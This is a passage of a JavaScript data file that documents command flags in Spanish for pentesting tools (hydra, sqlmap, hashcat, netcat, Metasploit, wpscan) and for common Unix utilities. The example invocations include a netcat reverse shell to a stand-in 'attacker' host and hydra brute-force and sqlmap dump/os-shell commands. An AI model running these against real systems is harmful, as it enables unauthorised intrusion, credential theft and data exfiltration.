            { flag: '-w', name: 'Wordlist', description: 'Ruta al diccionario de contraseñas para ataque por fuerza bruta', requiresValue: true, valueHint: 'rockyou.txt' },
            { flag: '-b', name: 'BSSID', description: 'MAC del punto de acceso objetivo', requiresValue: true, valueHint: 'AA:BB:CC:DD:EE:FF' },
            { flag: '-e', name: 'ESSID', description: 'Nombre de la red WiFi objetivo', requiresValue: true, valueHint: 'MiRed' },
            { flag: '-a', name: 'Modo ataque', description: 'Tipo de ataque: 1=WEP, 2=WPA-PSK', requiresValue: true, valueHint: '2' },
            { flag: '-l', name: 'Guardar clave', description: 'Guarda la clave encontrada en un archivo', requiresValue: true, valueHint: 'key.txt' },
            { flag: '-q', name: 'Silencioso', description: 'Modo silencioso, menos output' },
            { flag: '-J', name: 'Hashcat', description: 'Crea archivo para crackear con hashcat', requiresValue: true, valueHint: 'hash.hccapx' },
        ],
        commonCombinations: ['aircrack-ng -w rockyou.txt -b BSSID capture.cap', 'aircrack-ng -a 2 -w wordlist.txt *.cap']
    },

    hydra: {
        command: 'hydra',
        description: 'Herramienta de cracking de contraseñas por fuerza bruta en red',
        synopsis: 'hydra [opciones] servidor servicio',
        args: [
            { flag: '-l', name: 'Usuario', description: 'Usuario específico para atacar', requiresValue: true, valueHint: 'admin' },
            { flag: '-L', name: 'Lista usuarios', description: 'Archivo con lista de usuarios', requiresValue: true, valueHint: 'users.txt' },
            { flag: '-p', name: 'Password', description: 'Contraseña específica a probar', requiresValue: true, valueHint: 'password123' },
            { flag: '-P', name: 'Lista passwords', description: 'Archivo con lista de contraseñas', requiresValue: true, valueHint: 'rockyou.txt' },
            { flag: '-s', name: 'Puerto', description: 'Puerto del servicio si no es el default', requiresValue: true, valueHint: '2222' },
            { flag: '-t', name: 'Threads', description: 'Número de conexiones paralelas', requiresValue: true, valueHint: '16' },
            { flag: '-f', name: 'Stop on first', description: 'Detiene al encontrar la primera credencial válida' },
            { flag: '-v', name: 'Verbose', description: 'Muestra cada intento de login' },
            { flag: '-V', name: 'Muy verbose', description: 'Muestra usuario+password de cada intento' },
            { flag: '-o', name: 'Output', description: 'Guarda resultados en archivo', requiresValue: true, valueHint: 'found.txt' },
        ],
        commonCombinations: ['hydra -l admin -P rockyou.txt ssh://192.168.1.1', 'hydra -L users.txt -P pass.txt ftp://target']
    },

    sqlmap: {
        command: 'sqlmap',
        description: 'Herramienta automática de inyección SQL y takeover de BD',
        synopsis: 'sqlmap [opciones]',
        args: [
            { flag: '-u', name: 'URL', description: 'URL objetivo con parámetro inyectable', requiresValue: true, valueHint: '"http://site.com/page?id=1"' },
            { flag: '--dbs', name: 'Listar BDs', description: 'Enumera las bases de datos disponibles' },
            { flag: '-D', name: 'Database', description: 'Base de datos a atacar', requiresValue: true, valueHint: 'mysql' },
            { flag: '--tables', name: 'Listar tablas', description: 'Enumera las tablas de la BD seleccionada' },
            { flag: '-T', name: 'Tabla', description: 'Tabla específica a atacar', requiresValue: true, valueHint: 'users' },
            { flag: '--dump', name: 'Volcar datos', description: 'Extrae todos los datos de la tabla' },
            { flag: '--columns', name: 'Listar columnas', description: 'Enumera las columnas de la tabla' },
            { flag: '--batch', name: 'Batch mode', description: 'Responde automáticamente a todas las preguntas' },
            { flag: '--level', name: 'Nivel', description: 'Nivel de tests (1-5)', requiresValue: true, valueHint: '3' },
            { flag: '--risk', name: 'Riesgo', description: 'Nivel de riesgo (1-3)', requiresValue: true, valueHint: '2' },
            { flag: '--os-shell', name: 'Shell SO', description: 'Intenta obtener shell del sistema operativo' },
            { flag: '--passwords', name: 'Passwords', description: 'Extrae hashes de contraseñas de la BD' },
        ],
        commonCombinations: ['sqlmap -u "http://site.com/?id=1" --dbs --batch', 'sqlmap -u URL -D db -T users --dump']
    },

    nikto: {
        command: 'nikto',
        description: 'Escáner de vulnerabilidades web',
        synopsis: 'nikto [opciones]',
        args: [
            { flag: '-h', name: 'Host', description: 'Host o IP objetivo', requiresValue: true, valueHint: '192.168.1.1' },
            { flag: '-p', name: 'Puerto', description: 'Puerto del servidor web', requiresValue: true, valueHint: '8080' },
            { flag: '-ssl', name: 'SSL', description: 'Forzar conexión SSL/HTTPS' },
            { flag: '-o', name: 'Output', description: 'Archivo de salida', requiresValue: true, valueHint: 'report.html' },
            { flag: '-Format', name: 'Formato', description: 'Formato de salida: htm, csv, txt, xml', requiresValue: true, valueHint: 'htm' },
            { flag: '-Tuning', name: 'Tuning', description: 'Tipos de tests a ejecutar', requiresValue: true, valueHint: '123bde' },
            { flag: '-evasion', name: 'Evasión', description: 'Técnicas de evasión IDS', requiresValue: true, valueHint: '1' },
            { flag: '-update', name: 'Actualizar', description: 'Actualiza la base de datos de plugins' },
        ],
        commonCombinations: ['nikto -h http://target.com', 'nikto -h target -ssl -o report.html -Format htm']
    },

    gobuster: {
        command: 'gobuster',
        description: 'Herramienta de fuzzing/bruteforce de directorios y subdominios',
        synopsis: 'gobuster [modo] [opciones]',
        args: [
            { flag: 'dir', name: 'Modo directorios', description: 'Bruteforce de directorios/archivos' },
            { flag: 'dns', name: 'Modo DNS', description: 'Bruteforce de subdominios' },
            { flag: 'vhost', name: 'Modo vhost', description: 'Bruteforce de virtual hosts' },
            { flag: '-u', name: 'URL', description: 'URL objetivo', requiresValue: true, valueHint: 'http://target.com' },
            { flag: '-w', name: 'Wordlist', description: 'Diccionario a usar', requiresValue: true, valueHint: '/usr/share/wordlists/dirb/common.txt' },
            { flag: '-t', name: 'Threads', description: 'Número de hilos concurrentes', requiresValue: true, valueHint: '50' },
            { flag: '-x', name: 'Extensiones', description: 'Extensiones a probar', requiresValue: true, valueHint: 'php,html,txt' },
            { flag: '-s', name: 'Códigos válidos', description: 'Códigos HTTP a considerar válidos', requiresValue: true, valueHint: '200,204,301,302' },
            { flag: '-o', name: 'Output', description: 'Archivo de salida', requiresValue: true, valueHint: 'results.txt' },
            { flag: '-k', name: 'Skip SSL', description: 'Ignora errores de certificado SSL' },
        ],
        commonCombinations: ['gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt', 'gobuster dns -d target.com -w subdomains.txt']
    },

    john: {
        command: 'john',
        description: 'John the Ripper - Cracker de contraseñas offline',
        synopsis: 'john [opciones] archivo_hashes',
        args: [
            { flag: '--wordlist', name: 'Diccionario', description: 'Archivo de diccionario para ataque', requiresValue: true, valueHint: 'rockyou.txt' },
            { flag: '--format', name: 'Formato', description: 'Formato del hash (md5, sha256, etc)', requiresValue: true, valueHint: 'raw-md5' },
            { flag: '--rules', name: 'Reglas', description: 'Aplica reglas de mutación al diccionario' },
            { flag: '--show', name: 'Mostrar', description: 'Muestra contraseñas ya crackeadas' },
            { flag: '--incremental', name: 'Incremental', description: 'Modo de fuerza bruta incremental' },
            { flag: '--fork', name: 'Procesos', description: 'Número de procesos paralelos', requiresValue: true, valueHint: '4' },
            { flag: '--pot', name: 'Potfile', description: 'Archivo donde guardar resultados', requiresValue: true, valueHint: 'cracked.pot' },
        ],
        commonCombinations: ['john --wordlist=rockyou.txt hashes.txt', 'john --show hashes.txt', 'john --format=raw-md5 hashes.txt']
    },

    hashcat: {
        command: 'hashcat',
        description: 'Cracker de contraseñas GPU - el más rápido',
        synopsis: 'hashcat [opciones] hash wordlist',
        args: [
            { flag: '-m', name: 'Tipo hash', description: 'Modo/tipo de hash (0=MD5, 1000=NTLM, 2500=WPA)', requiresValue: true, valueHint: '0' },
            { flag: '-a', name: 'Modo ataque', description: 'Tipo ataque: 0=dict, 1=combi, 3=brute, 6=hybrid', requiresValue: true, valueHint: '0' },
            { flag: '-o', name: 'Output', description: 'Archivo para guardar contraseñas', requiresValue: true, valueHint: 'cracked.txt' },
            { flag: '--show', name: 'Mostrar', description: 'Muestra hashes ya crackeados' },
            { flag: '-r', name: 'Reglas', description: 'Archivo de reglas de mutación', requiresValue: true, valueHint: 'best64.rule' },
            { flag: '-w', name: 'Workload', description: 'Perfil de carga: 1=bajo, 2=default, 3=alto, 4=nightmare', requiresValue: true, valueHint: '3' },
            { flag: '--force', name: 'Forzar', description: 'Ignora advertencias y errores' },
            { flag: '-O', name: 'Optimizado', description: 'Activa kernels optimizados (limita longitud)' },
        ],
        commonCombinations: ['hashcat -m 0 -a 0 hashes.txt rockyou.txt', 'hashcat -m 2500 capture.hccapx rockyou.txt']
    },

    nc: {
        command: 'nc',
        description: 'Netcat - Navaja suiza de redes TCP/UDP',
        synopsis: 'nc [opciones] host puerto',
        args: [
            { flag: '-l', name: 'Listen', description: 'Modo escucha (servidor)' },
            { flag: '-p', name: 'Puerto', description: 'Puerto local a usar', requiresValue: true, valueHint: '4444' },
            { flag: '-e', name: 'Ejecutar', description: 'Ejecuta programa al conectar (shell reversa)', requiresValue: true, valueHint: '/bin/bash' },
            { flag: '-v', name: 'Verbose', description: 'Muestra información detallada' },
            { flag: '-n', name: 'No DNS', description: 'No resuelve nombres DNS' },
            { flag: '-u', name: 'UDP', description: 'Usa UDP en lugar de TCP' },
            { flag: '-z', name: 'Zero I/O', description: 'Modo escaneo, no envía datos' },
            { flag: '-w', name: 'Timeout', description: 'Timeout de conexión en segundos', requiresValue: true, valueHint: '3' },
        ],
        commonCombinations: ['nc -lvnp 4444', 'nc -e /bin/bash attacker 4444', 'nc -zv target 1-1000']
    },

    tcpdump: {
        command: 'tcpdump',
        description: 'Capturador de paquetes de red en línea de comandos',
        synopsis: 'tcpdump [opciones] [expresión]',
        args: [
            { flag: '-i', name: 'Interfaz', description: 'Interfaz de red a capturar', requiresValue: true, valueHint: 'eth0' },
            { flag: '-w', name: 'Escribir', description: 'Guarda captura en archivo pcap', requiresValue: true, valueHint: 'capture.pcap' },
            { flag: '-r', name: 'Leer', description: 'Lee captura desde archivo', requiresValue: true, valueHint: 'capture.pcap' },
            { flag: '-n', name: 'No DNS', description: 'No resuelve nombres de host' },
            { flag: '-nn', name: 'No resolver', description: 'No resuelve hosts ni puertos' },
            { flag: '-X', name: 'Hex+ASCII', description: 'Muestra contenido en hex y ASCII' },
            { flag: '-A', name: 'ASCII', description: 'Muestra contenido solo en ASCII' },
            { flag: '-c', name: 'Count', description: 'Captura N paquetes y termina', requiresValue: true, valueHint: '100' },
            { flag: '-v', name: 'Verbose', description: 'Salida detallada (-vv, -vvv más detalle)' },
            { flag: 'port', name: 'Puerto', description: 'Filtra por puerto específico', requiresValue: true, valueHint: '80' },
            { flag: 'host', name: 'Host', description: 'Filtra por IP o hostname', requiresValue: true, valueHint: '192.168.1.1' },
        ],
        commonCombinations: ['tcpdump -i eth0 -w capture.pcap', 'tcpdump -i any port 80 -A', 'tcpdump -nnvvX host 192.168.1.1']
    },

    msfconsole: {
        command: 'msfconsole',
        description: 'Metasploit Framework - Plataforma de explotación',
        synopsis: 'msfconsole [opciones]',
        args: [
            { flag: '-q', name: 'Quiet', description: 'Inicia sin banner' },
            { flag: '-x', name: 'Ejecutar', description: 'Ejecuta comandos al iniciar', requiresValue: true, valueHint: '"use exploit/..."' },
            { flag: '-r', name: 'Resource', description: 'Ejecuta script de recursos', requiresValue: true, valueHint: 'script.rc' },
            { flag: 'search', name: 'Buscar', description: 'Busca módulos por nombre/CVE', requiresValue: true, valueHint: 'eternalblue' },
            { flag: 'use', name: 'Usar módulo', description: 'Selecciona un módulo de exploit', requiresValue: true, valueHint: 'exploit/windows/smb/ms17_010' },
            { flag: 'set', name: 'Configurar', description: 'Configura opciones del módulo', requiresValue: true, valueHint: 'RHOSTS 192.168.1.1' },
            { flag: 'run', name: 'Ejecutar', description: 'Ejecuta el exploit/módulo actual' },
            { flag: 'exploit', name: 'Explotar', description: 'Alias de run para exploits' },
        ],
        commonCombinations: ['msfconsole -q', 'msfconsole -x "use exploit/multi/handler; set payload ..."']
    },

    wpscan: {
        command: 'wpscan',
        description: 'Escáner de vulnerabilidades WordPress',
        synopsis: 'wpscan [opciones]',
        args: [
            { flag: '--url', name: 'URL', description: 'URL del sitio WordPress', requiresValue: true, valueHint: 'http://target.com' },
            { flag: '-e', name: 'Enumerar', description: 'Enumerar: u=users, vp=vuln plugins, ap=all plugins', requiresValue: true, valueHint: 'u,vp' },
            { flag: '--api-token', name: 'API Token', description: 'Token de WPVulnDB para obtener vulnerabilidades', requiresValue: true, valueHint: 'TOKEN' },
            { flag: '-P', name: 'Passwords', description: 'Lista de contraseñas para bruteforce', requiresValue: true, valueHint: 'rockyou.txt' },
            { flag: '-U', name: 'Usuarios', description: 'Lista de usuarios para bruteforce', requiresValue: true, valueHint: 'users.txt' },
            { flag: '--plugins-detection', name: 'Detección plugins', description: 'Modo: mixed, passive, aggressive', requiresValue: true, valueHint: 'aggressive' },
            { flag: '-o', name: 'Output', description: 'Archivo de salida', requiresValue: true, valueHint: 'report.json' },
        ],
        commonCombinations: ['wpscan --url http://target -e u,vp', 'wpscan --url http://target -U admin -P rockyou.txt']
    },

    dirb: {
        command: 'dirb',
        description: 'Escáner de directorios web por fuerza bruta',
        synopsis: 'dirb <url> [wordlist] [opciones]',
        args: [
            { flag: '-o', name: 'Output', description: 'Guarda resultados en archivo', requiresValue: true, valueHint: 'output.txt' },
            { flag: '-r', name: 'No recursivo', description: 'No busca recursivamente en subdirectorios' },
            { flag: '-z', name: 'Delay', description: 'Añade delay entre peticiones (ms)', requiresValue: true, valueHint: '100' },
            { flag: '-a', name: 'User-Agent', description: 'User-Agent personalizado', requiresValue: true, valueHint: '"Mozilla/5.0..."' },
            { flag: '-c', name: 'Cookie', description: 'Cookie a enviar con cada petición', requiresValue: true, valueHint: '"session=abc"' },
            { flag: '-H', name: 'Header', description: 'Header HTTP personalizado', requiresValue: true, valueHint: '"Authorization: Bearer ..."' },
            { flag: '-p', name: 'Proxy', description: 'Usar proxy HTTP', requiresValue: true, valueHint: 'http://127.0.0.1:8080' },
        ],
        commonCombinations: ['dirb http://target /usr/share/wordlists/dirb/common.txt', 'dirb http://target -o results.txt']
    },


    sed: {
        command: 'sed',
        description: 'Editor de flujo para transformar texto',
        synopsis: 'sed [OPCIONES] SCRIPT [ARCHIVO...]',
        args: [
            { flag: '-i', name: 'In-place', description: 'Edita archivos directamente sin crear backup' },
            { flag: '-e', name: 'Script', description: 'Añade script/comando a ejecutar', requiresValue: true, valueHint: '"s/foo/bar/"' },
            { flag: '-n', name: 'No print', description: 'Suprime la salida automática, solo imprime con p' },
            { flag: '-r', name: 'Regex extendido', description: 'Usa expresiones regulares extendidas' },
            { flag: '-f', name: 'Archivo script', description: 'Lee comandos desde archivo', requiresValue: true, valueHint: 'script.sed' },
            { flag: 's/', name: 'Sustituir', description: 'Comando de sustitución: s/patrón/reemplazo/flags' },
            { flag: '/g', name: 'Global', description: 'Reemplaza todas las ocurrencias, no solo la primera' },
        ],
        commonCombinations: ['sed "s/foo/bar/g" file', 'sed -i "s/old/new/g" *.txt', 'sed -n "10,20p" archivo']
    },

    awk: {
        command: 'awk',
        description: 'Lenguaje de procesamiento de texto orientado a columnas',
        synopsis: 'awk [OPCIONES] PROGRAMA [ARCHIVO...]',
        args: [
            { flag: '-F', name: 'Separador', description: 'Define el separador de campos', requiresValue: true, valueHint: '":"' },
            { flag: '-v', name: 'Variable', description: 'Asigna variable antes de ejecutar', requiresValue: true, valueHint: 'var=value' },
            { flag: '-f', name: 'Archivo', description: 'Lee programa AWK desde archivo', requiresValue: true, valueHint: 'script.awk' },
            { flag: 'NR', name: 'Reg number', description: 'Variable: número de registro actual' },
            { flag: 'NF', name: 'Num fields', description: 'Variable: número de campos en registro actual' },
            { flag: '$0', name: 'Línea', description: 'Variable: toda la línea actual' },
            { flag: '$1', name: 'Campo 1', description: 'Variable: primer campo de la línea' },
        ],
        commonCombinations: ['awk "{print $1}" file', 'awk -F: "{print $1}" /etc/passwd', 'awk "NR>1" file.csv']
    },

    cut: {
        command: 'cut',
        description: 'Extraer secciones de cada línea de archivos',
        synopsis: 'cut OPCIÓN... [ARCHIVO...]',
        args: [
            { flag: '-d', name: 'Delimitador', description: 'Usa caracter como delimitador de campo', requiresValue: true, valueHint: '":" ' },
            { flag: '-f', name: 'Campos', description: 'Selecciona estos campos', requiresValue: true, valueHint: '1,3-5' },
            { flag: '-c', name: 'Caracteres', description: 'Selecciona estos caracteres', requiresValue: true, valueHint: '1-10' },
            { flag: '-b', name: 'Bytes', description: 'Selecciona estos bytes', requiresValue: true, valueHint: '1-10' },
            { flag: '--complement', name: 'Complemento', description: 'Selecciona todo excepto los campos especificados' },
        ],
        commonCombinations: ['cut -d: -f1 /etc/passwd', 'cut -c1-10 file', 'cut -d, -f2,4 data.csv']
    },

    sort: {
        command: 'sort',
        description: 'Ordenar líneas de archivos de texto',
        synopsis: 'sort [OPCIÓN]... [ARCHIVO]...',
        args: [
            { flag: '-n', name: 'Numérico', description: 'Ordena numéricamente, no alfabéticamente' },
            { flag: '-r', name: 'Reverso', description: 'Orden descendente' },
            { flag: '-k', name: 'Key', description: 'Ordena por campo específico', requiresValue: true, valueHint: '2' },
            { flag: '-t', name: 'Separador', description: 'Usa caracter como separador de campo', requiresValue: true, valueHint: '"," ' },
            { flag: '-u', name: 'Único', description: 'Elimina líneas duplicadas al ordenar' },
            { flag: '-h', name: 'Human', description: 'Ordena tamaños legibles (2K, 1G)' },
            { flag: '-f', name: 'Ignorar caso', description: 'Ignora mayúsculas/minúsculas' },
        ],
        commonCombinations: ['sort -n file', 'sort -k2 -t, data.csv', 'sort -rn | head -10']
    },

    wc: {
        command: 'wc',
        description: 'Contar líneas, palabras y bytes de archivos',
        synopsis: 'wc [OPCIÓN]... [ARCHIVO]...',
        args: [
            { flag: '-l', name: 'Líneas', description: 'Cuenta solo líneas' },
            { flag: '-w', name: 'Palabras', description: 'Cuenta solo palabras' },
            { flag: '-c', name: 'Bytes', description: 'Cuenta solo bytes' },
            { flag: '-m', name: 'Caracteres', description: 'Cuenta solo caracteres' },
            { flag: '-L', name: 'Max línea', description: 'Muestra longitud de la línea más larga' },
        ],
        commonCombinations: ['wc -l file', 'cat file | wc -w', 'find . -name "*.py" | wc -l']
    },

    // ===================== REDES ADICIONALES =====================

    ping: {
        command: 'ping',
        description: 'Enviar paquetes ICMP ECHO_REQUEST a hosts de red',
        synopsis: 'ping [OPCIONES] DESTINO',
        args: [
            { flag: '-c', name: 'Count', description: 'Número de paquetes a enviar', requiresValue: true, valueHint: '4' },
            { flag: '-i', name: 'Intervalo', description: 'Segundos entre cada ping', requiresValue: true, valueHint: '1' },
            { flag: '-t', name: 'TTL', description: 'Establece el Time To Live', requiresValue: true, valueHint: '64' },
            { flag: '-s', name: 'Tamaño', description: 'Tamaño en bytes del paquete', requiresValue: true, valueHint: '56' },
            { flag: '-W', name: 'Timeout', description: 'Segundos de espera por respuesta', requiresValue: true, valueHint: '3' },
            { flag: '-q', name: 'Quiet', description: 'Solo muestra resumen al final' },
            { flag: '-f', name: 'Flood', description: 'Modo flood, envía lo más rápido posible (requiere root)' },
        ],
        commonCombinations: ['ping -c 4 google.com', 'ping -i 0.5 -c 10 host', 'ping -c 1 -W 1 host']
    },

    wget: {
        command: 'wget',
        description: 'Descargador de archivos no interactivo',
        synopsis: 'wget [OPCIONES] [URL...]',
        args: [
            { flag: '-O', name: 'Output', description: 'Guarda con nombre específico', requiresValue: true, valueHint: 'archivo.zip' },
            { flag: '-c', name: 'Continuar', description: 'Continúa descarga parcialmente completada' },
            { flag: '-r', name: 'Recursivo', description: 'Descarga recursivamente' },
            { flag: '-P', name: 'Directorio', description: 'Guarda en directorio especificado', requiresValue: true, valueHint: '/descargas' },
            { flag: '-q', name: 'Quiet', description: 'Modo silencioso' },
            { flag: '-b', name: 'Background', description: 'Ejecuta en segundo plano' },
            { flag: '--limit-rate', name: 'Velocidad', description: 'Limita velocidad de descarga', requiresValue: true, valueHint: '200k' },
            { flag: '-U', name: 'User-Agent', description: 'Establece User-Agent', requiresValue: true, valueHint: '"Mozilla/5.0"' },
            { flag: '--no-check-certificate', name: 'Sin verificar SSL', description: 'Ignora errores de certificado' },
        ],
        commonCombinations: ['wget URL', 'wget -c URL', 'wget -r --no-parent URL']
    },

    dig: {
        command: 'dig',
        description: 'Herramienta de consulta DNS',
        synopsis: 'dig [@servidor] nombre [tipo]',
        args: [
            { flag: '+short', name: 'Corto', description: 'Muestra solo la respuesta, sin detalles' },
            { flag: '+trace', name: 'Trace', description: 'Traza la delegación DNS desde la raíz' },
            { flag: '-x', name: 'Reverse', description: 'Consulta DNS inversa de una IP', requiresValue: true, valueHint: '8.8.8.8' },
            { flag: 'A', name: 'Tipo A', description: 'Consulta registros A (IPv4)' },
            { flag: 'AAAA', name: 'Tipo AAAA', description: 'Consulta registros AAAA (IPv6)' },
            { flag: 'MX', name: 'Tipo MX', description: 'Consulta registros de correo' },
            { flag: 'NS', name: 'Tipo NS', description: 'Consulta servidores de nombres' },
            { flag: 'TXT', name: 'Tipo TXT', description: 'Consulta registros de texto' },
            { flag: 'ANY', name: 'Tipo ANY', description: 'Consulta todos los tipos de registro' },
        ],
        commonCombinations: ['dig google.com', 'dig +short google.com', 'dig MX google.com', 'dig @8.8.8.8 domain.com']
    },

    traceroute: {
        command: 'traceroute',
        description: 'Trazar la ruta de paquetes a un host de red',
        synopsis: 'traceroute [OPCIONES] HOST',
        args: [
            { flag: '-n', name: 'No DNS', description: 'No resuelve nombres de host' },
            { flag: '-m', name: 'Max hops', description: 'Número máximo de saltos', requiresValue: true, valueHint: '30' },
            { flag: '-w', name: 'Timeout', description: 'Segundos de espera por respuesta', requiresValue: true, valueHint: '5' },
            { flag: '-q', name: 'Queries', description: 'Número de sondas por salto', requiresValue: true, valueHint: '3' },
            { flag: '-I', name: 'ICMP', description: 'Usa ICMP ECHO en lugar de UDP' },
            { flag: '-T', name: 'TCP', description: 'Usa TCP SYN para sondas' },
            { flag: '-p', name: 'Puerto', description: 'Puerto destino inicial', requiresValue: true, valueHint: '33434' },
        ],
        commonCombinations: ['traceroute google.com', 'traceroute -n host', 'traceroute -I host']
    },

    scp: {
        command: 'scp',
        description: 'Copia segura de archivos entre hosts vía SSH',
        synopsis: 'scp [OPCIONES] origen destino',
        args: [
            { flag: '-P', name: 'Puerto', description: 'Puerto SSH del host remoto', requiresValue: true, valueHint: '22' },
            { flag: '-i', name: 'Clave', description: 'Archivo de clave privada', requiresValue: true, valueHint: '~/.ssh/id_rsa' },
            { flag: '-r', name: 'Recursivo', description: 'Copia directorios recursivamente' },
            { flag: '-p', name: 'Preservar', description: 'Preserva tiempos y permisos' },
            { flag: '-C', name: 'Compresión', description: 'Habilita compresión' },
            { flag: '-v', name: 'Verbose', description: 'Modo verbose' },
            { flag: '-q', name: 'Quiet', description: 'Suprime mensajes de progreso' },
        ],
        commonCombinations: ['scp file user@host:/path/', 'scp -r carpeta/ user@host:', 'scp user@host:file ./']
    },

    rsync: {
        command: 'rsync',
        description: 'Sincronización rápida y versátil de archivos',
        synopsis: 'rsync [OPCIONES] origen destino',
        args: [
            { flag: '-a', name: 'Archive', description: 'Modo archivo: recursivo, preserva todo (-rlptgoD)' },
            { flag: '-v', name: 'Verbose', description: 'Muestra archivos transferidos' },
            { flag: '-z', name: 'Comprimir', description: 'Comprime datos durante la transferencia' },
            { flag: '-P', name: 'Progreso', description: 'Muestra progreso y permite resumir' },
            { flag: '--delete', name: 'Eliminar', description: 'Elimina archivos en destino que no existen en origen' },
            { flag: '-e', name: 'Shell', description: 'Especifica shell remoto', requiresValue: true, valueHint: '"ssh -p 2222"' },
            { flag: '--exclude', name: 'Excluir', description: 'Excluye archivos que coincidan', requiresValue: true, valueHint: '"*.log"' },
            { flag: '-n', name: 'Dry run', description: 'Simula la operación sin hacer cambios' },
        ],
        commonCombinations: ['rsync -avz origen/ destino/', 'rsync -avzP origen/ user@host:destino/', 'rsync -av --delete src/ dst/']
    },

    // ===================== SISTEMA Y MONITOREO =====================

    systemctl: {
        command: 'systemctl',
        description: 'Controlar el sistema systemd y gestor de servicios',
        synopsis: 'systemctl [OPCIONES] COMANDO [UNIDAD...]',
        args: [
            { flag: 'start', name: 'Iniciar', description: 'Inicia una unidad/servicio' },
            { flag: 'stop', name: 'Detener', description: 'Detiene una unidad/servicio' },
            { flag: 'restart', name: 'Reiniciar', description: 'Reinicia una unidad/servicio' },
            { flag: 'reload', name: 'Recargar', description: 'Recarga configuración sin reiniciar' },
            { flag: 'status', name: 'Estado', description: 'Muestra estado de una unidad' },
            { flag: 'enable', name: 'Habilitar', description: 'Habilita inicio automático en boot' },
            { flag: 'disable', name: 'Deshabilitar', description: 'Deshabilita inicio automático' },
            { flag: 'list-units', name: 'Listar', description: 'Lista unidades cargadas' },
            { flag: '--type', name: 'Tipo', description: 'Filtra por tipo', requiresValue: true, valueHint: 'service' },
        ],
        commonCombinations: ['systemctl status nginx', 'systemctl restart apache2', 'systemctl enable --now docker']
    },

    top: {
        command: 'top',
        description: 'Monitor de procesos en tiempo real',
        synopsis: 'top [OPCIONES]',
        args: [
            { flag: '-d', name: 'Delay', description: 'Segundos entre actualizaciones', requiresValue: true, valueHint: '1' },
            { flag: '-u', name: 'Usuario', description: 'Solo procesos de este usuario', requiresValue: true, valueHint: 'root' },
            { flag: '-p', name: 'PID', description: 'Solo estos PIDs', requiresValue: true, valueHint: '1234,5678' },
            { flag: '-n', name: 'Iteraciones', description: 'Número de actualizaciones antes de salir', requiresValue: true, valueHint: '10' },
            { flag: '-b', name: 'Batch', description: 'Modo batch para redirigir a archivo' },
            { flag: '-H', name: 'Threads', description: 'Muestra hilos individuales' },
        ],
        commonCombinations: ['top', 'top -u www-data', 'top -bn1 | head -20']
    },

    htop: {
        command: 'htop',
        description: 'Visor de procesos interactivo mejorado',
        synopsis: 'htop [OPCIONES]',
        args: [
            { flag: '-d', name: 'Delay', description: 'Décimas de segundo entre actualizaciones', requiresValue: true, valueHint: '10' },
            { flag: '-u', name: 'Usuario', description: 'Solo procesos de este usuario', requiresValue: true, valueHint: 'root' },
            { flag: '-p', name: 'PID', description: 'Solo estos PIDs', requiresValue: true, valueHint: '1234' },
            { flag: '-s', name: 'Ordenar', description: 'Ordenar por columna', requiresValue: true, valueHint: 'PERCENT_CPU' },
            { flag: '-t', name: 'Árbol', description: 'Vista en árbol de procesos' },
        ],
        commonCombinations: ['htop', 'htop -u root', 'htop -t']
    },

    free: {
        command: 'free',
        description: 'Mostrar cantidad de memoria libre y usada',
        synopsis: 'free [OPCIONES]',
        args: [
            { flag: '-h', name: 'Human', description: 'Muestra en formato legible (GB, MB)' },
            { flag: '-b', name: 'Bytes', description: 'Muestra en bytes' },
            { flag: '-k', name: 'Kilobytes', description: 'Muestra en kilobytes' },
            { flag: '-m', name: 'Megabytes', description: 'Muestra en megabytes' },
            { flag: '-g', name: 'Gigabytes', description: 'Muestra en gigabytes' },
            { flag: '-s', name: 'Segundos', description: 'Repite cada N segundos', requiresValue: true, valueHint: '1' },
            { flag: '-t', name: 'Total', description: 'Muestra línea con totales' },
        ],
        commonCombinations: ['free -h', 'free -m', 'free -h -s 1']
    },

    df: {
        command: 'df',
        description: 'Reportar uso de espacio en sistemas de archivos',
        synopsis: 'df [OPCIONES] [ARCHIVO...]',
        args: [
            { flag: '-h', name: 'Human', description: 'Muestra en formato legible (GB, MB)' },
            { flag: '-T', name: 'Tipo', description: 'Muestra tipo de sistema de archivos' },
            { flag: '-i', name: 'Inodos', description: 'Muestra uso de inodos en lugar de bloques' },
            { flag: '-a', name: 'Todos', description: 'Incluye sistemas de archivos pseudo y duplicados' },
            { flag: '--total', name: 'Total', description: 'Muestra total de todos los sistemas' },
            { flag: '-x', name: 'Excluir', description: 'Excluye sistemas de archivos de tipo', requiresValue: true, valueHint: 'tmpfs' },
        ],
        commonCombinations: ['df -h', 'df -hT', 'df -h /home']
    },

    du: {
        command: 'du',
        description: 'Estimar uso de espacio de archivos',
        synopsis: 'du [OPCIONES] [ARCHIVO...]',
        args: [
            { flag: '-h', name: 'Human', description: 'Muestra en formato legible' },
            { flag: '-s', name: 'Sumario', description: 'Solo muestra total para cada argumento' },
            { flag: '-c', name: 'Total', description: 'Añade línea con gran total' },
            { flag: '-a', name: 'Todos', description: 'Incluye conteo para archivos, no solo directorios' },
            { flag: '-d', name: 'Profundidad', description: 'Máxima profundidad de directorios', requiresValue: true, valueHint: '1' },
            { flag: '--exclude', name: 'Excluir', description: 'Excluye archivos que coincidan', requiresValue: true, valueHint: '"*.log"' },
        ],
        commonCombinations: ['du -sh *', 'du -h --max-depth=1', 'du -sh /var/log']
    },

    lsof: {
        command: 'lsof',
        description: 'Listar archivos abiertos por procesos',
        synopsis: 'lsof [OPCIONES]',
        args: [
            { flag: '-i', name: 'Internet', description: 'Archivos de red, opcionalmente filtrar por puerto', requiresValue: true, valueHint: ':80' },
            { flag: '-u', name: 'Usuario', description: 'Archivos abiertos por usuario', requiresValue: true, valueHint: 'www-data' },
            { flag: '-p', name: 'PID', description: 'Archivos abiertos por PID', requiresValue: true, valueHint: '1234' },
            { flag: '-c', name: 'Comando', description: 'Archivos abiertos por comando', requiresValue: true, valueHint: 'nginx' },
            { flag: '+D', name: 'Directorio', description: 'Busca en directorio recursivamente', requiresValue: true, valueHint: '/var' },
            { flag: '-t', name: 'Terse', description: 'Solo muestra PIDs, útil para scripts' },
        ],
        commonCombinations: ['lsof -i :80', 'lsof -u root', 'lsof +D /var/log']
    },

    chown: {
        command: 'chown',
        description: 'Cambiar propietario y grupo de archivos',
        synopsis: 'chown [OPCIONES] PROPIETARIO[:GRUPO] ARCHIVO...',
        args: [
            { flag: '-R', name: 'Recursivo', description: 'Opera recursivamente en directorios' },
            { flag: '-v', name: 'Verbose', description: 'Muestra mensaje por cada archivo procesado' },
            { flag: '-c', name: 'Changes', description: 'Como verbose pero solo muestra cambios' },
